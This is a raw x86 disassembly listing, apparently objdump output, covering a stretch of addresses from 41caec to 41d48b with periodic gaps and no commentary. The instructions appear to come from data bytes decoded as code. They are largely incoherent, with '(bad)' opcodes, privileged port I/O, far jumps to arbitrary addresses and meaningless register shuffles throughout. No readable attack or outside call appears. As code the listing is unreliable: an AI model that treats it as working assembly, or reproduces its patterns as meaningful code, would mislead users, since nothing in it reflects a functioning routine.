  41caec:	fs gs push ebx
  41caef:	gs popaw 
  41caf2:	push   ecx
  41caf3:	imul   ebx,DWORD PTR [ebp+0x6c],0xffffffd9
  41caf7:	pop    ecx
  41caf8:	aas    
  41caf9:	jb     0x41cad3
  41cafb:	push   ebp
  41cafc:	popa   
  41cafd:	outs   dx,BYTE PTR ds:[esi]
  41cafe:	test   eax,0xb66c5d80
  41cb03:	and    DWORD PTR [ecx+0x63],0x5100d91c
  41cb0a:	sbb    esi,0xc
  41cb0d:	jne    0x41cb8c
  41cb0f:	mov    dl,0x1e
  41cb11:	pop    esp
  41cb12:	dec    edi
  41cb13:	in     eax,0xc
  41cb15:	pop    edi
  41cb16:	js     0x41cb1e
  41cb18:	cmp    eax,DWORD PTR [esi+0x68]
  41cb1b:	aam    0x34
  41cb1d:	dec    ebp
  41cb1e:	dec    esp
  41cb1f:	cwde   
  41cb20:	sub    DWORD PTR [ebp+0x32],ebp
  41cb23:	xchg   ecx,eax
  41cb24:	add    al,0x50
  41cb26:	cmp    eax,0x43750f91
  41cb2b:	xchg   edx,eax
  41cb2c:	and    BYTE PTR [eax],al
  41cb2e:	push   ecx
  41cb2f:	jno    0x41cb4e
  41cb31:	jb     0x41cb85
  41cb33:	mov    ds:0x7c1c6325,eax
  41cb38:	and    esi,DWORD PTR [ecx+0x8]
  41cb3b:	and    DWORD PTR [eax],0x72
  41cb3e:	cmove  ebp,DWORD PTR [edi]
  41cb41:	arpl   cx,si
  41cb43:	adc    BYTE PTR fs:[ebx-0x20],ah
  41cb47:	pop    edx
  41cb48:	adc    al,BYTE PTR [eax]
	...
  41cb72:	add    ah,cl
  41cb74:	xor    al,0xf
  41cb76:	je     0x41cb94
  41cb78:	ins    BYTE PTR es:[edi],dx
  41cb79:	and    esi,DWORD PTR [ecx-0x18]
  41cb7c:	test   DWORD PTR [ecx],esp
  41cb7e:	imul   eax,ecx,0x43
  41cb81:	xor    DWORD PTR [ebp-0x32],ebp
  41cb84:	das    
  41cb85:	add    DWORD PTR [ebx-0x31],edx
  41cb88:	movd   mm7,DWORD PTR es:[ebp-0x33ffe1da]
  41cb90:	and    dl,BYTE PTR [eax]
  41cb92:	jno    0x41cb3f
  41cb94:	hlt    
  41cb95:	push   cs
  41cb96:	fs sbb al,0xec
  41cb99:	and    esi,DWORD PTR [ecx-0x58]
  41cb9c:	jmp    FWORD PTR [ecx]
  41cb9e:	jb     0x41cc0a
  41cba0:	and    esp,DWORD PTR [esi]
  41cba2:	arpl   WORD PTR [ecx+edx*8],bx
  41cba5:	and    esp,DWORD PTR [esi-0x70]
  41cba8:	pop    ebx
  41cba9:	sahf   
  41cbaa:	and    cl,BYTE PTR [esi-0x76bf4442]
  41cbb0:	mov    ebp,0x987f1e8d
  41cbb5:	xchg   esp,eax
  41cbb6:	adc    edi,DWORD PTR [eax+ecx*4]
  41cbb9:	xchg   esi,eax
  41cbba:	sbb    eax,0x1188ac68
  41cbbf:	aas    
  41cbc0:	xchg   edi,eax
  41cbc1:	mov    al,ds:0x79be4825
  41cbc6:	and    eax,0x3443af3f
  41cbcb:	dec    esi
  41cbcc:	les    eax,FWORD PTR [ebp+0x1d]
  41cbcf:	dec    eax
  41cbd0:	mov    esi,0xc44d045a
  41cbd5:	inc    ebp
  41cbd6:	sbb    BYTE PTR [eax],al
	...
  41cc00:	xor    DWORD PTR [edx-0x62bfd6c7],edi
  41cc06:	adc    esi,DWORD PTR [ecx+esi*8]
  41cc09:	mov    ecx,0x97f02939
  41cc0e:	push   ds
  41cc0f:	fistp  WORD PTR ss:[ebx+edi*1+0x1087e034]
  41cc17:	sbb    bh,bh
  41cc19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc1a:	out    0x3b,eax
  41cc1c:	add    DWORD PTR [eax-0x5830fbed],ebp
  41cc22:	or     al,0x16
  41cc24:	sbb    al,0x8b
  41cc26:	push   cs
  41cc27:	push   ss
  41cc28:	rcr    BYTE PTR [edx+0x17],1
  41cc2b:	cmp    ebx,DWORD PTR [ebx+ecx*4]
  41cc2e:	repz sbb ebp,esi
  41cc31:	pop    edx
  41cc32:	mov    edx,0xd75ad436
  41cc37:	adc    eax,0x1fc0bcc9
  41cc3c:	mov    edi,0xb70bfda7
  41cc41:	(bad)  
  41cc42:	out    0x2f,eax
  41cc44:	fimul  DWORD PTR [esi-0x4ca11c69]
  41cc4a:	add    BYTE PTR [ecx-0x3b8d39cd],bh
  41cc50:	xor    DWORD PTR [ebx+0x51],ebx
  41cc53:	xchg   esi,eax
  41cc54:	xor    eax,0x118875af
  41cc59:	mov    eax,0x8b2baf5c
  41cc5e:	and    BYTE PTR [edi+edx*1+0x966cab],ah
	...
  41cc8d:	or     DWORD PTR [eax-0x709a628e],edi
  41cc93:	push   eax
  41cc94:	leave  
  41cc95:	fs mov bl,0x70
  41cc98:	jge    0x41cc98
  41cc9a:	test   al,0x63
  41cc9c:	pop    ebx
  41cc9d:	or     al,0x8e
  41cc9f:	ins    DWORD PTR es:[edi],dx
  41cca0:	pop    ebx
  41cca1:	sbb    ebp,DWORD PTR [edx-0x4804b790]
  41cca7:	pop    esp
  41cca8:	sbb    al,0x56
  41ccaa:	call   0x4842:0xc6ff5654
  41ccb1:	xor    al,BYTE PTR [eax+0x336bfb32]
  41ccb7:	aas    
  41ccb8:	xor    al,0x24
  41ccba:	scas   eax,DWORD PTR es:[edi]
  41ccbb:	ins    DWORD PTR es:[edi],dx
  41ccbc:	pop    ss
  41ccbd:	sub    ebx,DWORD PTR [ebx+0x51]
  41ccc0:	push   cs
  41ccc1:	inc    esi
  41ccc2:	scas   eax,DWORD PTR es:[edi]
  41ccc3:	jne    0x41cccd
  41ccc5:	or     bh,BYTE PTR [eax-0x74dbd8a4]
  41cccb:	and    BYTE PTR [eax+edx*1],ch
  41ccce:	stos   DWORD PTR es:[edi],eax
  41cccf:	ins    BYTE PTR es:[edi],dx
  41ccd0:	push   cs
  41ccd1:	xor    bh,BYTE PTR [eax-0x56f7ea8e]
  41ccd7:	ins    DWORD PTR es:[edi],dx
  41ccd8:	pop    es
  41ccd9:	sub    edi,eax
  41ccdb:	arpl   dx,bx
  41ccdd:	pop    ds
  41ccde:	mov    ebx,DWORD PTR [edi-0x26]
  41cce1:	adc    ch,BYTE PTR [esi+0x5afbdb6d]
  41cce7:	push   eax
  41cce8:	enter  0xaa12,0x75
  41ccec:	add    BYTE PTR [edx+0x4d],cl
  41ccef:	fs push esp
	...
  41cd19:	add    ah,bl
  41cd1b:	dec    esi
  41cd1c:	popa   
  41cd1d:	add    BYTE PTR [ebp-0xa8b9083],bh
  41cd23:	jb     0x41cd90
  41cd25:	lods   al,BYTE PTR ds:[si]
  41cd27:	jl     0x41cd29
  41cd29:	push   eax
  41cd2a:	stos   BYTE PTR es:[edi],al
  41cd2b:	dec    eax
  41cd2c:	je     0x41cd2e
  41cd2e:	mov    esp,0x9c74657c
  41cd33:	ja     0x41cda1
  41cd35:	push   eax
  41cd36:	xchg   esp,eax
  41cd37:	dec    edx
  41cd38:	push   0x704a8300
  41cd3d:	push   ebx
  41cd3e:	pushf  
  41cd3f:	dec    edx
  41cd40:	popa   
  41cd41:	cs dec ebp
  41cd43:	jnp    0x41cdb1
  41cd45:	add    BYTE PTR [ecx-0x5b],bl
  41cd48:	jb     0x41cdb3
  41cd4a:	bound  edi,QWORD PTR [esi+0x74]
  41cd4d:	gs push ss
  41cd4f:	push   edi
  41cd50:	cs imul ebp,ebx,0x35c0055
  41cd57:	jle    0x41cdc7
  41cd59:	inc    esp
  41cd5a:	fmul   QWORD PTR [edi+0x61]
  41cd5d:	pop    esp
  41cd5e:	inc    esi
  41cd5f:	jl     0x41cdcf
  41cd61:	data16 fadd QWORD PTR [ebx+0x4810535c]
  41cd68:	outs   dx,DWORD PTR ds:[esi]
  41cd69:	imul   ebp,DWORD PTR [edx],0x29006f7d
  41cd6f:	push   0x56067361
  41cd74:	imul   ebp,DWORD PTR [esi+0x66],0x5e
  41cd78:	dec    edi
  41cd79:	outs   dx,DWORD PTR ds:[esi]
  41cd7a:	and    edx,DWORD PTR [ebx+0x73]
  41cd7d:	popa   
	...
  41cda6:	add    BYTE PTR [edi+0x79],dl
  41cda9:	pop    esp
  41cdaa:	push   esi
  41cdab:	adc    al,0x7d
  41cdad:	inc    esp
  41cdae:	jns    0x41ce1e
  41cdb0:	jns    0x41ce0e
  41cdb2:	push   ebx
  41cdb3:	pusha  
  41cdb4:	ja     0x41ce27
  41cdb6:	jb     0x41cdd4
  41cdb8:	pop    ds
  41cdb9:	inc    edi
  41cdba:	pop    eax
  41cdbb:	sbb    al,0x5
  41cdbd:	and    BYTE PTR [esi-0x46],ch
  41cdc0:	or     ch,BYTE PTR [eax]
  41cdc2:	and    BYTE PTR [ebx+eiz*1+0x15],ch
  41cdc6:	push   0x741ccf1c
  41cdcb:	mov    fs,WORD PTR [ebx]
  41cdcd:	inc    edi
  41cdce:	pop    eax
  41cdcf:	ins    BYTE PTR es:[edi],dx
  41cdd0:	inc    esp
  41cdd1:	sub    eax,0x25c88571
  41cdd6:	jno    0x41ce1a
  41cdd8:	int3   
  41cdd9:	sbb    eax,0x47001c6c
  41cdde:	push   esp
  41cddf:	dec    esp
  41cde0:	(bad)  
  41cde1:	adc    eax,0x33444471
  41cde6:	jae    0x41ce37
  41cde8:	fdiv   QWORD PTR [ebx]
  41cdea:	addr16 push eax
  41cdec:	xlat   BYTE PTR ds:[ebx]
  41cded:	fidiv  WORD PTR [edi+0x31]
  41cdf0:	mov    BYTE PTR [ecx+edx*2],al
  41cdf3:	inc    ecx
  41cdf4:	xchg   esi,eax
  41cdf5:	sbb    ah,BYTE PTR [ebx+0x2e]
  41cdf8:	inc    esp
  41cdf9:	ss jno 0x41ce3d
  41cdfc:	xchg   esi,eax
  41cdfd:	and    bl,BYTE PTR [edi+0x31]
  41ce00:	lahf   
  41ce01:	add    al,0x50
  41ce03:	std    
  41ce04:	je     0x41ce19
  41ce06:	jne    0x41ce0b
  41ce08:	jbe    0x41ce32
	...
  41ce32:	add    BYTE PTR [eax],al
  41ce34:	loop   0x41ce9d
  41ce36:	adc    al,0x50
  41ce38:	repz push ebp
  41ce3a:	sbb    BYTE PTR [eax],al
  41ce3c:	iret   
  41ce3d:	pusha  
  41ce3e:	sub    dh,BYTE PTR [ebx+ebp*8+0x62]
  41ce42:	push   ss
  41ce43:	arpl   ax,cx
  41ce45:	test   BYTE PTR [esi],dl
  41ce47:	ja     0x41ce42
  41ce49:	xor    eax,0x65c1552d
  41ce4e:	xor    esp,DWORD PTR [edi-0x38]
  41ce51:	pop    esi
  41ce52:	xor    al,0x73
  41ce54:	mov    esi,0xb4711a2f
  41ce59:	pop    edx
  41ce5a:	int3   
  41ce5b:	adc    eax,0x1aa98f1c
  41ce60:	test   al,0xa5
  41ce62:	shl    BYTE PTR [ecx],0xbf
  41ce65:	mov    dl,0xe7
  41ce67:	and    eax,0x1ad2a6bb
  41ce6c:	mov    dh,BYTE PTR [esi-0x53801e41]
  41ce72:	out    0x3b,eax
  41ce74:	jns    0x41ce22
  41ce76:	mov    bl,0x21
  41ce78:	arpl   WORD PTR [esi-0x53b0fc74],di
  41ce7e:	test   BYTE PTR ds:0x2684ba82,dl
  41ce84:	sbb    al,0x8b
  41ce86:	mov    BYTE PTR [ebp*2+0x401596a8],dl
  41ce8d:	pop    ebx
  41ce8e:	xchg   edi,eax
  41ce8f:	and    BYTE PTR [esi-0x59],cl
  41ce92:	out    0x34,eax
  41ce94:	cmp    DWORD PTR [ecx+0x1873],edi
	...
  41cebe:	add    BYTE PTR [eax],al
  41cec0:	add    BYTE PTR [ebx-0x53],ah
  41cec3:	dec    esp
  41cec4:	xor    BYTE PTR [edi-0x4d],bl
  41cec7:	push   edi
  41cec8:	and    eax,0x1d599742
  41cecd:	xor    dh,BYTE PTR [esi-0x53c0ccd5]
  41ced3:	cmp    bl,BYTE PTR ds:0x43ac109
  41ced9:	lock xchg ebp,eax
  41cedb:	das    
  41cedc:	adc    al,0xeb
  41cede:	shl    BYTE PTR [ebx],0x12
  41cee1:	sti    
  41cee2:	test   al,0xc
  41cee4:	add    al,0xd8
  41cee6:	mov    dh,0x19
  41cee8:	sbb    eax,0xde1ab5ea
  41ceed:	cmc    
  41ceee:	stos   DWORD PTR es:[edi],eax
  41ceef:	out    0xe1,eax
  41cef1:	repz mov ecx,0xbfd112fa
  41cef7:	stc    
  41cef8:	daa    
  41cef9:	(bad)  
  41cefa:	jp     0x41cefc
  41cefc:	mov    bl,0x3f
  41cefe:	jp     0x41cf00
  41cf00:	retf   
  41cf01:	arpl   WORD PTR [eax],si
  41cf03:	push   edx
  41cf04:	(bad)  
  41cf05:	add    DWORD PTR [edi-0x43f2378b],esp
  41cf0b:	pop    esp
  41cf0c:	lods   al,BYTE PTR ds:[esi]
  41cf0d:	pop    ss
  41cf0e:	stos   DWORD PTR es:[edi],eax
  41cf0f:	pop    edi
  41cf10:	mov    edi,0xbf67acdb
  41cf15:	inc    esp
  41cf16:	pop    ebx
  41cf17:	inc    ebx
  41cf18:	shr    DWORD PTR [edi],0x90
  41cf1b:	outs   dx,BYTE PTR ds:[esi]
  41cf1c:	lods   eax,DWORD PTR ds:[esi]
  41cf1d:	sub    eax,0x32c476b8
  41cf22:	mov    ds:0x946d,eax
	...
  41cf4b:	add    BYTE PTR [eax],al
  41cf4d:	add    BYTE PTR [ebx+ebx*2+0x51],al
  41cf51:	test   BYTE PTR ds:0x1f9b63a9,cl
  41cf57:	mov    WORD PTR [ecx-0x7c],?
  41cf5a:	or     eax,0x4945fa1
  41cf5f:	pop    ebx
  41cf60:	push   eax
  41cf61:	mov    BYTE PTR [esi],ch
  41cf63:	stos   BYTE PTR es:[edi],al
  41cf64:	jne    0x41ceec
  41cf66:	sub    eax,0xf8e00b7
  41cf6b:	nop
  41cf6c:	jno    0x41cfc8
  41cf6e:	adc    edi,DWORD PTR [esi-0x68e7ba8e]
  41cf74:	addr16 pop ebx
  41cf76:	cmc    
  41cf77:	mov    ecx,0xa80e3e74
  41cf7c:	add    BYTE PTR [edx],bl
  41cf7e:	cmp    edi,DWORD PTR [ecx-0x52c6c98c]
  41cf84:	arpl   WORD PTR ds:0x9489a4a,dx
  41cf8a:	dec    edi
  41cf8b:	mov    esi,0x90131d66
  41cf90:	jb     0x41cf96
  41cf92:	sub    al,0x9a
  41cf94:	ins    BYTE PTR es:[edi],dx
  41cf95:	or     BYTE PTR [edi],cl
  41cf97:	stos   BYTE PTR es:[edi],al
  41cf98:	addr16 or bl,dl
  41cf9b:	xchg   BYTE PTR [eax+0x0],dl
  41cf9e:	add    DWORD PTR [ecx+0x7c045054],ebx
  41cfa4:	pop    edi
  41cfa5:	outs   dx,DWORD PTR ds:[esi]
  41cfa6:	dec    eax
  41cfa7:	dec    ebp
  41cfa8:	je     0x41d01d
  41cfaa:	xor    eax,0x76707495
  41cfaf:	xor    BYTE PTR [edx+0x76],0x0
	...
  41cfdb:	pop    eax
  41cfdc:	dec    ecx
  41cfdd:	add    BYTE PTR [esi+0x49],al
  41cfe0:	dec    ebx
  41cfe1:	push   ecx
  41cfe2:	jae    0x41d03c
  41cfe4:	dec    ecx
  41cfe5:	dec    esi
  41cfe6:	popa   
  41cfe7:	lock add DWORD PTR [eax],0x46
  41cfeb:	leave  
  41cfec:	dec    edx
  41cfed:	push   eax
  41cfee:	popa   
  41cfef:	(bad)  
  41cff0:	dec    ecx
  41cff1:	jae    0x41d062
  41cff3:	(bad)  
  41cff4:	jbe    0x41cff6
  41cff6:	pop    edi
  41cff7:	retf   
  41cff8:	inc    esi
  41cff9:	jo     0x41d04b
  41cffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cffc:	dec    ecx
  41cffd:	outs   dx,DWORD PTR ds:[esi]
  41cffe:	ja     0x41cfa2
  41d000:	dec    esp
  41d001:	add    BYTE PTR fs:[ebx-0x53bb8fba],bh
  41d008:	dec    esp
  41d009:	popa   
  41d00a:	arpl   WORD PTR [ecx+0x4d],cx
  41d00d:	jb     0x41d088
  41d00f:	mov    ch,0x69
  41d011:	dec    ebx
  41d012:	inc    esi
  41d013:	test   eax,0x8523d65
  41d018:	imul   ecx,DWORD PTR [esi+0x43],0xffffffed
  41d01c:	ss push eax
  41d01e:	outs   dx,DWORD PTR ds:[esi]
  41d01f:	pop    ebx
  41d020:	push   ebx
  41d021:	jae    0x41d084
  41d023:	inc    edi
  41d024:	jbe    0x41d082
  41d026:	inc    esi
  41d027:	icebp  
  41d028:	push   ecx
  41d029:	outs   dx,BYTE PTR ds:[esi]
  41d02a:	xor    DWORD PTR [bp+si+0x635f],ebx
  41d02f:	loop   0x41d076
  41d031:	outs   dx,BYTE PTR ds:[esi]
  41d032:	je     0x41d07a
  41d034:	push   edi
  41d035:	dec    edi
  41d036:	outs   dx,DWORD PTR ds:[esi]
  41d037:	sub    edx,DWORD PTR [ebx+0x73]
  41d03a:	popa   
  41d03b:	pop    ss
  41d03c:	jbe    0x41d09a
  41d03e:	inc    esi
	...
  41d067:	add    BYTE PTR [eax+esi*2],bl
  41d06a:	xor    al,0x41
  41d06c:	lock pop edx
  41d06e:	and    eax,0x2f77d06e
  41d073:	addr16 enter 0xf56,0x0
  41d078:	out    dx,eax
  41d079:	push   esp
  41d07a:	es je  0x41d048
  41d07d:	bound  edx,QWORD PTR [edx]
  41d07f:	arpl   ax,bx
  41d081:	lock sbb esp,DWORD PTR [esi-0x58]
  41d085:	sbb    ebx,ebx
  41d087:	ins    BYTE PTR es:[edi],dx
  41d088:	scas   al,BYTE PTR es:[edi]
  41d089:	sbb    al,0x2d
  41d08b:	inc    esi
  41d08c:	enter  0x3ff3,0x6c
  41d090:	test   DWORD PTR [edi],ebx
  41d092:	sbb    esi,DWORD PTR [eax+esi*2-0x2f]
  41d096:	sbb    DWORD PTR [ecx+eax*4-0xf],esi
  41d09a:	add    BYTE PTR [esi],ch
  41d09c:	jae    0x41d08a
  41d09e:	pop    ds
  41d09f:	add    BYTE PTR [edx-0x3b],cl
  41d0a2:	sbb    al,0x6c
  41d0a4:	sbb    al,0xd6
  41d0a6:	adc    al,0x70
  41d0a8:	js     0x41d08d
  41d0aa:	pcmpeqb mm6,QWORD PTR [edx]
  41d0ad:	lods   eax,DWORD PTR ds:[esi]
  41d0ae:	adc    BYTE PTR [esp+ebx*1-0x8],ah
  41d0b2:	inc    ebx
  41d0b3:	push   eax
  41d0b4:	outs   dx,DWORD PTR ds:[esi]
  41d0b5:	frstor [edx]
  41d0b7:	je     0x41d10c
  41d0b9:	jecxz  0x41d0c9
  41d0bb:	arpl   WORD PTR [eax-0x8],sp
  41d0be:	sbb    DWORD PTR [edx+0x41],esi
  41d0c1:	mov    eax,ds:0xbb2e6d18
  41d0c6:	in     al,0x4c
  41d0c8:	sub    al,0x8f
  41d0ca:	sldt   WORD PTR [eax]
	...
  41d0f5:	inc    eax
  41d0f6:	jno    0x41d114
  41d0f8:	pop    edi
  41d0f9:	push   cs
  41d0fa:	lahf   
  41d0fb:	sub    BYTE PTR [ecx-0x7],dl
  41d0fe:	sbb    BYTE PTR [bx-0x6],ah
  41d102:	pushf  
  41d103:	ucomiss xmm7,xmm7
  41d106:	mov    al,ds:0x5ad8000f
  41d10b:	cmp    bl,BYTE PTR [ebx+edx*8]
  41d10e:	test   al,0x4
  41d110:	sub    ch,cl
  41d112:	mov    bh,0x1b
  41d114:	sbb    bl,bh
  41d116:	mov    esp,0x6bf91106
  41d11b:	es aam 0xf0
  41d11e:	addr16 int 0x20
  41d121:	mov    ebp,0xed2fe7a9
  41d126:	ret    0x1208
  41d129:	mov    edi,0xa826bab6
  41d12e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d12f:	rcr    BYTE PTR ds:0x1105a9c1,1
  41d135:	mov    bl,0xbe
  41d137:	rcl    BYTE PTR [edi],0x7f
  41d13a:	pop    ebx
  41d13b:	mov    ds:0xb9ba8430,eax
  41d140:	or     BYTE PTR es:[eax-0x3d77e834],0xbd
  41d148:	and    al,0x6d
  41d14a:	mov    eax,ds
  41d14c:	sub    al,0x2c
  41d14e:	mov    esp,ss
  41d150:	(bad)  [edx+ebp*4-0x7d]
  41d154:	sbb    ch,BYTE PTR [eax-0x4a]
  41d157:	out    0x2f,eax
	...
  41d181:	add    BYTE PTR [ebp-0x44],bl
  41d184:	lea    esp,ds:0x16aab63f
  41d18a:	dec    esp
  41d18b:	jnp    0x41d127
  41d18d:	sbb    al,0x3a
  41d18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d190:	jbe    0x41d1b4
  41d192:	cs mov dh,0xe7
  41d195:	pop    ss
  41d196:	aas    
  41d197:	mov    edx,0xab302257
  41d19c:	out    0x10,eax
  41d19e:	xor    bh,BYTE PTR [edi+0x7d0c2544]
  41d1a4:	dec    esp
  41d1a5:	or     al,0xff
  41d1a7:	pop    edx
  41d1a8:	cmp    bl,BYTE PTR ds:0x3a00b610
  41d1ae:	mov    ax,0x355f
  41d1b2:	and    BYTE PTR [edx-0x55c2e299],ch
  41d1b8:	adc    BYTE PTR cs:[esi],al
  41d1bb:	mov    ah,0x0
  41d1bd:	xor    eax,0x195fb824
  41d1c2:	jl     0x9f45de3a
  41d1c8:	arpl   WORD PTR [eax],cx
  41d1ca:	xor    BYTE PTR [ebp-0x75e7e6ac],dl
  41d1d0:	dec    ebp
  41d1d1:	daa    
  41d1d2:	in     al,dx
  41d1d3:	test   DWORD PTR [edi],edi
  41d1d5:	mov    ebx,0xc44c8edc
  41d1da:	add    BYTE PTR [ebx-0x47f637ab],ch
  41d1e0:	add    BYTE PTR [eax-0x378b55cb],ah
	...
  41d20e:	add    BYTE PTR [ebx],ch
  41d210:	mov    edi,0xc31bc850
  41d215:	add    BYTE PTR [ebp-0x5aa058c8],ch
  41d21b:	sbb    BYTE PTR [ecx-0x55c74700],ch
  41d221:	jno    0x41d1b9
  41d223:	push   es
  41d224:	test   eax,0xbe27e964
  41d229:	jno    0x41d1c0
  41d22b:	adc    eax,0x1f8c6b8c
  41d230:	mov    BYTE PTR [ecx-0x7c],dh
  41d233:	xor    DWORD PTR [ebp+0x5afc845f],ebx
  41d239:	push   edx
  41d23a:	test   BYTE PTR [esi+edi*4],dl
  41d23d:	je     0x41d28b
  41d23f:	pop    esp
  41d240:	mov    ah,0x72
  41d242:	inc    esp
  41d243:	add    esp,DWORD PTR [edi+0x5b115b6d]
  41d249:	push   eax
  41d24a:	xor    ah,BYTE PTR ds:[edi+0x5250004e]
  41d251:	bound  esp,QWORD PTR [ebp+0x47]
  41d254:	push   edi
  41d255:	inc    esi
  41d256:	push   ebx
  41d257:	and    eax,0x3a746b45
  41d25c:	je     0x41d2c9
  41d25e:	ins    BYTE PTR es:[edi],dx
  41d25f:	test   DWORD PTR [ebx+ebp*2+0x66],esp
  41d263:	adc    DWORD PTR [eax+0x5d],ecx
  41d266:	jb     0x41d278
  41d268:	or     DWORD PTR [ecx+0x61],0x37
  41d26c:	dec    ebx
  41d26d:	outs   dx,BYTE PTR gs:[esi]
  41d26f:	gs addr16 jb 0x41d2dc
	...
  41d29b:	add    BYTE PTR [esi],ch
  41d29d:	inc    ebp
  41d29e:	jne    0x41d30c
  41d2a0:	xor    eax,0x7322f73
  41d2a5:	dec    esi
  41d2a6:	je     0x41d2ee
  41d2a8:	push   ecx
  41d2a9:	inc    edi
  41d2aa:	imul   ebx,DWORD PTR cs:[ebx+0x4e],0x64714e00
  41d2b2:	gs je  0x41d295
  41d2b5:	push   ecx
  41d2b6:	cs imul ebp,ebx,0xbb5c0047
  41d2bd:	jnp    0x41d333
  41d2bf:	inc    esp
  41d2c0:	mov    DWORD PTR [edi+0x76],0x5d6f0565
  41d2c7:	jae    0x41d25f
  41d2c9:	ins    DWORD PTR es:[edi],dx
  41d2ca:	imul   esi,DWORD PTR [edx-0x5f],0x5e
  41d2ce:	push   ecx
  41d2cf:	jb     0x41d26a
  41d2d1:	pop    esi
  41d2d2:	push   ecx
  41d2d3:	jae    0x41d275
  41d2d5:	push   eax
  41d2d6:	dec    esi
  41d2d7:	popa   
  41d2d8:	test   al,0x7b
  41d2da:	add    BYTE PTR [edx-0x66],dl
  41d2dd:	inc    ebp
  41d2de:	je     0x41d324
  41d2e0:	pushf  
  41d2e1:	push   eax
  41d2e2:	popa   
  41d2e3:	arpl   WORD PTR [ecx],si
  41d2e5:	inc    ebp
  41d2e6:	jb     0x41d361
  41d2e8:	lds    ebp,FWORD PTR [esi+0x6b]
  41d2eb:	jb     0x41d33e
  41d2ed:	pop    edi
  41d2ee:	dec    edi
  41d2ef:	outs   dx,DWORD PTR ds:[esi]
  41d2f0:	sbb    al,0x9a
  41d2f2:	adc    BYTE PTR [ebp-0x3],dh
  41d2f5:	test   DWORD PTR ds:0xd90ef5c,ebx
  41d2fb:	je     0x41d2f1
  41d2fd:	push   ebx
  41d2fe:	add    BYTE PTR ss:[bx+si],al
	...
  41d326:	add    BYTE PTR [eax],al
  41d328:	add    BYTE PTR [edx],cl
  41d32a:	xchg   edi,eax
  41d32b:	push   ss
  41d32c:	and    al,dl
  41d32e:	sahf   
  41d32f:	and    ebp,DWORD PTR [eax+0x2]
  41d332:	push   ecx
  41d333:	sbb    BYTE PTR [ebp+0x3],ch
  41d336:	dec    ebx
  41d337:	sbb    eax,0x1d68c071
  41d33c:	(bad)  
  41d33d:	loopne 0x41d384
  41d33f:	sbb    DWORD PTR [esi-0x47],esi
  41d342:	jg     0x41d387
  41d344:	ins    DWORD PTR es:[edi],dx
  41d345:	mov    edx,0xc8611d59
  41d34a:	pop    edx
  41d34b:	pop    ss
  41d34c:	outs   dx,BYTE PTR ds:[esi]
  41d34d:	scas   eax,DWORD PTR es:[edi]
  41d34e:	xor    esi,DWORD PTR [ebx+eiz*2]
  41d351:	scas   al,BYTE PTR es:[edi]
  41d352:	or     DWORD PTR [esi],ebx
  41d354:	jb     0x41d326
  41d356:	cmp    dl,BYTE PTR [ecx]
  41d358:	arpl   WORD PTR [edx+edi*8],bx
  41d35b:	sub    al,0x50
  41d35d:	cmp    al,0xf5
  41d35f:	aaa    
  41d360:	dec    esi
  41d361:	push   0x1c4c37c6
  41d366:	add    ch,BYTE PTR ds:0x37015f50
  41d36c:	add    BYTE PTR [edx-0x1c],cl
  41d36f:	adc    ah,BYTE PTR [esi+0x1c]
  41d372:	and    BYTE PTR [ecx],dh
  41d374:	jb     0x41d3f1
  41d376:	loop   0x41d391
  41d378:	ins    BYTE PTR es:[edi],dx
  41d379:	jns    0x41d340
  41d37b:	add    BYTE PTR [ecx-0x7208a7a7],al
  41d381:	(bad)  
  41d382:	dec    ebx
  41d383:	sbb    DWORD PTR [ecx+0x7b],esi
  41d386:	sub    BYTE PTR [ecx],bl
  41d388:	je     0x41d3d2
  41d38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d38b:	retf   
  41d38c:	sub    al,0x0
	...
  41d3b6:	or     esi,DWORD PTR [ecx+ebx*1]
  41d3b9:	je     0x41d3e3
  41d3bb:	pop    ebx
  41d3bc:	push   edi
  41d3bd:	adc    eax,0x40e79e6
  41d3c2:	cmp    ch,BYTE PTR [edi+0x7a48ce57]
  41d3c8:	out    0x18,eax
  41d3ca:	or     al,0xc0
  41d3cc:	cmp    DWORD PTR [ebx],esp
  41d3ce:	sbb    al,0xb2
  41d3d0:	dec    eax
  41d3d1:	sbb    bh,al
  41d3d3:	js     0x41d420
  41d3d5:	and    esi,eax
  41d3d7:	pop    edx
  41d3d8:	push   cs
  41d3d9:	xor    eax,0x111bc101
  41d3de:	retf   
  41d3df:	lods   al,BYTE PTR ds:[esi]
  41d3e0:	add    al,0x28
  41d3e2:	shr    DWORD PTR [edx+0x7afb160c],1
  41d3e8:	cmp    bl,BYTE PTR [ecx]
  41d3ea:	mov    edx,0xce22feae
  41d3ef:	mov    edi,0xade337e7
  41d3f4:	sti    
  41d3f5:	jecxz  0x41d3d6
  41d3f7:	mov    bl,0xf9
  41d3f9:	push   ds
  41d3fa:	mov    ebp,0xb315d6ae
  41d3ff:	ins    DWORD PTR es:[edi],dx
  41d400:	out    0x37,eax
  41d402:	ret    
  41d403:	lods   eax,DWORD PTR ds:[esi]
  41d404:	fninit 
  41d406:	bound  edi,QWORD PTR [ecx-0x488cf026]
  41d40c:	shl    ebx,cl
  41d40e:	pop    ebx
  41d40f:	mov    edx,0x981c1bb3
  41d414:	mov    bh,0x1e
  41d416:	outs   dx,BYTE PTR ds:[esi]
  41d417:	mov    edx,0x3bfd
	...
  41d440:	add    BYTE PTR [eax],al
  41d442:	add    BYTE PTR [eax-0x6a],cl
  41d445:	mov    bl,0x27
  41d447:	ins    DWORD PTR es:[edi],dx
  41d448:	mov    bl,0x84
  41d44a:	pop    ss
  41d44b:	jo     0x41d3d4
  41d44d:	xchg   BYTE PTR [ebx],dl
  41d44f:	aas    
  41d450:	mov    ecx,0xb64124ab
  41d455:	xchg   esp,eax
  41d456:	and    bh,BYTE PTR [edx]
  41d458:	mov    edi,0xac3b10e7
  41d45d:	add    BYTE PTR [ebp+edi*8+0x97a70ae],cl
  41d464:	mov    cl,0x71
  41d466:	pop    ss
  41d467:	(bad)  
  41d468:	mov    edi,0x67fbe96e
  41d46d:	popa   
  41d46e:	dec    esp
  41d46f:	ficomp WORD PTR [edi-0x49b116ac]
  41d475:	cmp    ax,0x881b
  41d479:	jb     0x41d4bf
  41d47b:	xor    al,0x68
  41d47d:	popa   
  41d47e:	dec    esp
  41d47f:	ficomp WORD PTR [edi-0x72cb16ac]
  41d485:	push   ebx
  41d486:	jmp    0x35886ab9
  41d48b:	xor    ebp,DWORD PTR [eax+0x52]
